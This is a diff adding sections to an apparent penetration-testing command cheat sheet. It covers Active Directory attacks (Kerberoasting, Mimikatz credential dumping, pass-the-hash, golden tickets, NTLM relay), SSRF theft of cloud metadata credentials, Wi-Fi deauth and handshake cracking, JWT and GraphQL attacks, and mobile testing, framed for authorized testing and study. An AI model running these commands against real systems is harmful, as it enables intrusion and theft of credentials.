@@ -261,7 +261,224 @@ net localgroup administrators                 # Who's in the local admin group
 
 
 # =============================================================================
-# 13. CTF-SPECIFIC TOOLING
+# 13. ACTIVE DIRECTORY ATTACKS — THE SINGLE MOST IN-DEMAND PENTEST NICHE
+# =============================================================================
+
+# Most real-world corporate breaches pivot through Active Directory once a
+# single foothold is gained, because AD's own protocols (Kerberos, SMB, LDAP,
+# NTLM) contain design-era trust assumptions that modern tooling weaponizes
+# systematically. This is the core skill tested by OSCP/CRTP/CRTO-style exams.
+
+# --- Enumeration & attack-path mapping ---
+# BloodHound ingests AD's own LDAP/SMB data and models it as a graph —
+# "who can RDP into what," "who is a Domain Admin's session currently active
+# on," "what ACL grants me GenericAll over another user" — turning weeks of
+# manual enumeration into one visual shortest-path query.
+bloodhound-python -u user -p pass -d corp.local -c All -ns 10.0.0.5
+  # ^ Collect AD data remotely (SharpHound is the native Windows collector)
+# Then load the resulting JSON into the BloodHound GUI and run built-in
+# queries like "Shortest Path to Domain Admins."
+
+netexec smb 10.0.0.0/24 -u user -p pass --shares    # NetExec (CrackMapExec's actively maintained successor):
+netexec smb 10.0.0.5 -u user -p pass -x whoami         # mass credential validation + remote command exec
+netexec smb 10.0.0.5 -u user -H <ntlm_hash> --shares      # Pass-the-hash directly, no plaintext password needed
+
+# --- Kerberos attacks ---
+# Kerberoasting: any authenticated domain user can request a service ticket
+# (TGS) for ANY account with a registered SPN — that ticket is encrypted
+# with the SERVICE ACCOUNT's own NTLM hash, which can then be cracked
+# offline, entirely without touching the DC again after the initial request.
+GetUserSPNs.py corp.local/user:pass -dc-ip 10.0.0.5 -request
+  # ^ Impacket: request + dump crackable TGS tickets for every SPN account
+hashcat -m 13100 tickets.txt rockyou.txt          # Crack the extracted Kerberoast hashes offline
+
+# AS-REP Roasting: accounts with "Do not require Kerberos preauthentication"
+# set can have their AS-REP captured and cracked WITHOUT any valid credentials
+# at all — a pure enumeration + offline-crack attack against a misconfiguration.
+GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.5
+hashcat -m 18200 asrep_hashes.txt rockyou.txt
+
+# --- Credential theft & lateral movement ---
+# Mimikatz: the canonical Windows in-memory credential extraction tool —
+# reads plaintext passwords/hashes/Kerberos tickets straight out of LSASS
+# process memory on a compromised host (requires local admin already).
+mimikatz "sekurlsa::logonpasswords" exit    # Dump credentials cached in memory
+mimikatz "sekurlsa::pth /user:admin /domain:corp.local /ntlm:<hash> /run:cmd.exe"
+  # ^ Pass-the-hash: spawn a process authenticated AS that user using only
+  #   their NTLM hash — the plaintext password is never needed or recovered.
+
+# Pass-the-ticket: steal/reuse a Kerberos ticket (TGT or TGS) directly instead
+# of a password hash, impersonating a session that's already authenticated.
+mimikatz "sekurlsa::tickets /export" exit    # Dump Kerberos tickets from memory
+# Golden Ticket: forge a TGT from scratch using the domain's krbtgt account
+# hash — grants Kerberos authentication as ANY user, including ones that
+# don't exist, and survives a targeted password reset (it's forging the
+# ticket-granting authority itself, not stealing a session).
+mimikatz "kerberos::golden /user:fakeadmin /domain:corp.local /sid:<domain-sid> /krbtgt:<hash> /ptt" exit
+
+# Responder: sits on the local network and answers LLMNR/NBT-NS/mDNS
+# broadcast name-resolution requests that Windows sends when normal DNS
+# fails — tricking victim machines into authenticating (NTLM) directly to
+# the attacker, capturing crackable or relayable hashes with zero exploitation.
+responder -I eth0                              # Listen and harvest NTLM auth attempts
+ntlmrelayx.py -tf targets.txt -smb2support        # Relay a captured auth attempt onward to another host in
+                                                   # real time instead of just cracking it offline
+
+evil-winrm -i 10.0.0.5 -u administrator -H <ntlm_hash>   # Interactive WinRM shell via pass-the-hash
+impacket-psexec corp.local/administrator:pass@10.0.0.5      # Remote command exec, PsExec-style
+
+
+# =============================================================================
+# 14. CLOUD SECURITY TESTING
+# =============================================================================
+
+# Cloud misconfigurations (public S3 buckets, over-permissive IAM roles,
+# open security groups) are now a larger real-world breach vector than
+# classic network exploitation for many organizations — these tools audit for them.
+
+prowler aws                            # AWS: broad CIS-benchmark-aligned misconfiguration scan
+scoutsuite --provider aws                 # Multi-cloud (AWS/Azure/GCP) security posture auditor, HTML report
+
+# Pacu: an AWS-specific post-EXPLOITATION framework (assumes you already have
+# some valid AWS credentials, e.g. leaked in a repo or SSRF'd from an EC2
+# instance's metadata service) — enumerates privileges and automates common
+# escalation paths (assume-role chains, Lambda backdoors, IAM policy abuse).
+pacu                                  # Launch interactive Pacu console
+# > run iam__enum_permissions           # Discover what the current creds can actually do
+# > run iam__privesc_scan                  # Check for known IAM privilege-escalation paths
+
+# SSRF -> cloud metadata theft (the classic cloud-specific SSRF payoff):
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+  # ^ On an unprotected/legacy EC2 instance, an SSRF vulnerability in a web
+  #   app can be chained to steal the instance's own IAM role credentials —
+  #   this is exactly why AWS pushes IMDSv2 (token-required) as the default now.
+
+
+# =============================================================================
+# 15. CONTAINER & KUBERNETES SECURITY TESTING
+# =============================================================================
+
+kube-hunter --remote 10.0.0.5           # Actively probe a cluster for exploitable misconfigurations
+kube-bench                                 # CIS Kubernetes Benchmark compliance check (run as a cluster pod)
+trivy image myapp:1.0                         # Image vulnerability scanning (see Docker Notes section 11)
+trivy k8s --report summary cluster               # Scan an entire live cluster's workloads at once
+trivy config ./k8s-manifests/                        # Scan raw manifests for misconfigurations pre-deploy
+
+# Falco: runtime security — watches live syscalls (via eBPF or a kernel
+# module) and alerts on suspicious in-container behavior AFTER deployment,
+# complementing kube-bench/Trivy's pre-deployment, static checks.
+falco -r /etc/falco/falco_rules.yaml    # Run with the default ruleset (shell spawned in a container, etc.)
+
+# Common K8s misconfigurations pentesters specifically check for:
+#   - Anonymous/unauthenticated access to the kubelet API (port 10250) or API server
+#   - Pods running privileged: true or with hostPath mounting the host's root filesystem
+#   - Overly broad RBAC (a ServiceAccount bound to cluster-admin unnecessarily)
+#   - Exposed etcd (port 2379) with no client-cert auth — full cluster compromise
+#   - Secrets mounted into pods that don't need them, then readable via a shell
+
+
+# =============================================================================
+# 16. WIRELESS SECURITY
+# =============================================================================
+
+airmon-ng start wlan0                # Put the wireless adapter into monitor mode
+airodump-ng wlan0mon                    # Passively survey nearby networks + connected clients
+airodump-ng -c 6 --bssid <BSSID> -w capture wlan0mon  # Focus capture on one target AP's channel
+
+aireplay-ng --deauth 5 -a <BSSID> wlan0mon
+  # ^ Send deauthentication frames to force a client to reconnect — captures
+  #   the WPA/WPA2 4-way handshake needed for offline cracking (authorized
+  #   testing/lab only — deauth against a network you don't own is illegal
+  #   and is itself a denial-of-service attack)
+
+aircrack-ng -w rockyou.txt -b <BSSID> capture-01.cap   # Crack a captured WPA/WPA2 handshake offline
+hashcat -m 22000 capture.hc22000 rockyou.txt              # Modern hashcat WPA/WPA2 cracking format (faster, GPU)
+
+# WPA3 (SAE/"Dragonfly" handshake) is resistant to this offline-handshake-
+# capture approach by design — this class of attack is specifically a
+# WPA/WPA2-PSK weakness, worth knowing precisely which protocol it applies to.
+
+
+# =============================================================================
+# 17. REVERSE ENGINEERING & BINARY ANALYSIS
+# =============================================================================
+
+ghidra                               # Free NSA-developed disassembler/decompiler — the open-source
+                                         # industry-standard alternative to IDA Pro for static analysis
+radare2 -A ./binary                    # r2's own analyze-everything CLI disassembler/debugger
+  # > afl                                 # (inside r2) list all detected functions
+  # > pdf @ main                            # disassemble+decompile the "main" function
+
+objdump -d ./binary                  # Quick disassembly without a full RE suite
+readelf -h ./binary                     # ELF header details (architecture, entry point)
+strace ./binary                            # Trace every syscall a running program makes (Linux)
+ltrace ./binary                               # Trace library/function calls instead of raw syscalls
+
+frida-trace -i "open*" ./target       # Dynamic instrumentation: hook and log calls to functions
+                                          # matching a pattern WITHOUT recompiling or patching the binary,
+                                          # heavily used for both malware analysis and mobile app pentesting
+
+
+# =============================================================================
+# 18. API SECURITY TESTING
+# =============================================================================
+
+# APIs (REST/GraphQL) get their own attack surface beyond the OWASP Top 10 —
+# OWASP maintains a separate "API Security Top 10" for exactly this reason
+# (broken object-level authorization is #1 there too, same root cause as IDOR).
+
+# JWT attacks:
+#   alg:none    -> some libraries historically accepted a token with its
+#                    signature algorithm set to "none" and just trusted the
+#                    payload — always verify the server actually rejects this
+#   Key confusion (RS256 -> HS256) -> if a server accepts either algorithm and
+#     you know its RS256 PUBLIC key, you can sign a forged token with HS256
+#     USING that public key as the HMAC secret — the server may verify it
+#     as valid because it's checking "does this key work," not "was this
+#     signed with the expected algorithm."
+#   Weak/guessable HMAC secret -> brute-force the signing secret offline:
+jwt_tool <token> -C -d wordlist.txt    # jwt_tool: decode, tamper, and attack JWTs end-to-end
+hashcat -m 16500 jwt.txt rockyou.txt      # Crack a weak HS256 secret directly with hashcat
+
+# GraphQL-specific issues:
+#   Introspection left enabled in production leaks the ENTIRE schema —
+#     every type, field, query, and mutation the API supports, handing an
+#     attacker a complete map with zero guessing:
+curl -X POST https://target.com/graphql -H "Content-Type: application/json" \
+  -d '{"query":"{ __schema { types { name fields { name } } } } }"}'
+#   Batching/aliasing attacks -> bundle many queries into one HTTP request to
+#     bypass simple per-request rate limiting (each one still executes fully server-side)
+#   Deeply nested queries -> a single query can recursively request nested
+#     relations many levels deep, multiplying backend cost exponentially —
+#     a resource-exhaustion vector unique to GraphQL's query flexibility
+
+ffuf -u https://target.com/api/v1/FUZZ -w api-endpoints.txt -mc 200,401,403  # Enumerate undocumented API paths
+
+
+# =============================================================================
+# 19. SECRETS SCANNING — FINDING LEAKED CREDENTIALS IN CODE & GIT HISTORY
+# =============================================================================
+
+# Secrets committed to Git remain in HISTORY even after a later commit
+# deletes them — anyone who clones the repo can recover them from any prior
+# commit unless the history itself is rewritten. This is why secrets scanning
+# is now a standard CI gate (see CICD Notes section 13 for the automation side).
+
+gitleaks detect --source . -v          # Scan a repo's current tree AND full history for secret patterns
+gitleaks protect --staged                 # Pre-commit hook mode: block a commit before it's even made
+trufflehog git https://github.com/org/repo.git   # Alternative scanner, verifies many secret types live
+                                                   # (actually tests whether a found AWS key still works, not
+                                                   # just pattern-matches it) — far fewer false positives
+
+# If a real secret IS found in history: rotating the credential is mandatory
+# and non-optional (the git history itself, even after a force-push rewrite,
+# may already be cached by forks/CI logs/local clones) — a leaked secret is
+# compromised the moment it's pushed, not the moment someone is proven to
+# have used it.
+
+
+# =============================================================================
+# 20. CTF-SPECIFIC TOOLING
 # =============================================================================
 
 strings binary_file                  # Extract printable strings from a binary (quick recon)
@@ -276,7 +493,7 @@ checksec ./binary                           # Check binary protections: NX, PIE,
 
 
 # =============================================================================
-# 14. DEFENSIVE COUNTERPART: WHAT BLUE TEAM WATCHES FOR
+# 21. DEFENSIVE COUNTERPART: WHAT BLUE TEAM WATCHES FOR
 # =============================================================================
 
 # - Port scans        -> spikes in SYN packets to sequential ports from one source (IDS/IPS alert)
@@ -293,7 +510,30 @@ checksec ./binary                           # Check binary protections: NX, PIE,
 
 
 # =============================================================================
-# 15. LEGAL & ETHICAL BOUNDARIES — NON-NEGOTIABLE
+# 22. MOBILE APPLICATION SECURITY TESTING
+# =============================================================================
+
+# MobSF: automated static + dynamic analysis for Android (.apk) and iOS
+# (.ipa) — decompiles, checks for hardcoded secrets/insecure storage/weak
+# crypto, and can drive a live device/emulator for dynamic instrumentation.
+docker run -p 8000:8000 opensecurity/mobsf:latest    # Run MobSF's web UI locally, then upload an APK/IPA
+
+jadx -d output/ app.apk                # Decompile an APK to readable Java source
+apktool d app.apk                         # Decode APK resources + smali bytecode (for patching/repackaging)
+frida-ps -Uai                                # List processes on a connected mobile device (via frida-server)
+objection explore                               # Runtime mobile app exploration built on Frida — bypass SSL
+                                                    # pinning, dump the keychain/keystore, hook methods live,
+                                                    # all without recompiling the app
+
+# Common mobile-specific findings: hardcoded API keys in the APK, insecure
+# local storage (unencrypted SQLite/SharedPreferences), missing certificate
+# pinning (or pinning that's trivially bypassed via Frida/objection), and
+# exported Android components (Activities/Services/Receivers) reachable by
+# any other app on the device without permission checks.
+
+
+# =============================================================================
+# 23. LEGAL & ETHICAL BOUNDARIES — NON-NEGOTIABLE
 # =============================================================================
 
 # - Get written authorization (a signed scope of work / rules of engagement)
